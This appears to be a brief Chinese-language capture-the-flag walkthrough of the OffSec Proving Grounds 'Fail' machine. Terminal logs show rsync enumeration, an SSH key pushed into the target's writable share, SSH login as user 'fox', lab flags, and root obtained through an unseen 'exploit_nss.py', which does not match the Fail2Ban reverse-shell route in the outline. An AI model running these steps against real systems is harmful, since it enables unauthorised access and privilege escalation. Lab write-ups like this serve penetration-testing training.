参考资料：  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Fail.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Fail.md)
 
rsync  
[https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html#manual-rsync-usage](https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html#manual-rsync-usage)
 
枚举服务以发现打开的 rsync 共享及其可访问的文件。  
使用 rsync 将 SSH 公钥上传到目标系统。  
使用上传的密钥以标准用户身份获取 SSH 访问权限。  
识别并修改可写的 Fail2Ban 配置文件，以执行反向 shell 有效载荷。  
利用 Fail2Ban 基于 cron 的重启机制触发有效载荷，并获得 root 权限。  
┌──(kali㉿kali)-[~/Desktop/pg03/Fail]  
└─$ nmap -sV --script "rsync-list-modules" -p 873 192.168.141.126  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-12-12 07:05 EST  
Nmap scan report for 192.168.141.126  
Host is up (0.089s latency).
 
PORT STATE SERVICE VERSION  
873/tcp open rsync (protocol version 31)  
| rsync-list-modules:  
|_ fox fox home
 
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds   ┌──(kali㉿kali)-[~/Desktop/pg03/Fail]  
└─$
 
nadao fox user
   

rsync -av /home/kali/.ssh/ rsync://fox@192.168.141.126/fox/.ssh/  
┌──(kali㉿kali)-[~/Desktop/pg03/Fail]  
└─$ rsync -av /home/kali/.ssh/ rsync://fox@192.168.141.126/fox/.ssh/  
sending incremental file list  
created directory /.ssh  
./  
id_rsa  
id_rsa.pub  
id_rsa.txt  
known_hosts  
known_hosts.old
 
sent 8,665 bytes received 142 bytes 5,871.33 bytes/sec  
total size is 8,248 speedup is 0.94   ┌──(kali㉿kali)-[~/Desktop/pg03/Fail]  
└─$
 
┌──(kali㉿kali)-[~/.ssh]  
└─$ ssh -i id_rsa fox@192.168.141.126  
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
 
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
$ cd /home  
$ ls  
fox local.txt  
$ cat local.txt  
bf3a0280c125a01514b249e43f03ee42  
$
   

fox@fail:/tmp$ python3 exploit_nss.py  
# cd /root  
# ls  
proof.txt  
# cat proof.txt  
fbdb5ad35c9bad1c57a21dd30fc27477  
#